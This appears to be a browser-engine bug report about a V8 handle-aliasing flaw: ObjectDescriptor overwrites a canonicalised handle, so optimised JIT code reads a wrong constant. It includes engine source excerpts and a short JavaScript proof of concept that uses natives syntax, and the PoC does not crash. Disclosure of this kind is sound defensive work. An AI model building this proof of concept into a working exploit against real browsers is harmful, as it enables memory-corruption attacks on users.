Here's HandleScope::GetHandle and CanonicalHandleScope::Lookup used to get a handle location.

Object** HandleScope::GetHandle(Isolate* isolate, Object* value) {
  DCHECK(AllowHandleAllocation::IsAllowed());
  HandleScopeData* data = isolate->handle_scope_data();
  CanonicalHandleScope* canonical = data->canonical_scope;
  return canonical ? canonical->Lookup(value) : CreateHandle(isolate, value);
}

Object** CanonicalHandleScope::Lookup(Object* object) {
  DCHECK_LE(canonical_level_, isolate_->handle_scope_data()->level);
  ...
  Object*** entry = identity_map_->Get(object);
  if (*entry == nullptr) {
    // Allocate new handle location.
    *entry = HandleScope::CreateHandle(isolate_, object);
  }
  return reinterpret_cast<Object**>(*entry);
}

As you can see above, if the method is called within a CanonicalHandleScope scope, it checks if there's a cache for the given value, if there is, returns the cached location, otherwise, creates one for it.

The above routine implies that it's not a good idea to change the value of the handle as shown in the following example code.

CanonicalHandleScope canonical(isolate);
Handle<Smi> a(Smi::kZero, isolate);

*a.location() = Smi::FromInt(2);

Handle<Smi> b(Smi::kZero, isolate);  // b.location() == a.location()
b->value();  // == 2

But the ObjectDescriptor class does that.

Here's a snippet of the class (https://cs.chromium.org/chromium/src/v8/src/objects/literal-objects.cc?rcl=f0f13de9b59b2f7291de005456cf832f5409bb14&l=352).

  void CreateTemplates(Isolate* isolate, int slack) {
    ...
    temp_handle_ = handle(Smi::kZero, isolate);
  }

  void AddNamedProperty(Isolate* isolate, Handle<Name> name,
                        ClassBoilerplate::ValueKind value_kind,
                        int value_index) {
    Smi* value = Smi::FromInt(value_index);
    ...
      *temp_handle_.location() = value;
      ...
  }


PoC:
// Flags: --allow-natives-syntax

function deferred_func() {
    class C {
        method1() {

        }
    }
}

let bound = (a => a).bind(this, 0);

function opt() {
    deferred_func.prototype;  // ReduceJSLoadNamed

    return bound();
}

print(opt());  // 0
%OptimizeFunctionOnNextCall(opt);

print(opt());  // must print out 0, but actually it prints out 3

How the PoC works:
1. GetOptimizedCode uses CanonicalHandleScope.
2. JSNativeContextSpecialization::ReduceJSLoadNamed calls JSFunction::EnsureHasInitialMap which tries to compile the given function(deferred_func in the PoC).
    1. So ObjectDescriptor is used.
3. The ObjectDescriptor::AddNamedProperty method changes the value of handle(Smi::kZero, isolate) to "3".
4. Loading the bound function's arguments is reduced with: jsgraph()->Constant(handle(bound_arguments->get(i), isolate())))
    1. handle(bound_arguments->get(i), isolate()) returns the same handle, of which the value is "3", used in the vulnerable class.


Note that the PoC doesn't crash.



This bug is subject to a 90 day disclosure deadline. After 90 days elapse
or a patch has been made broadly available, the bug report will become
visible to the public.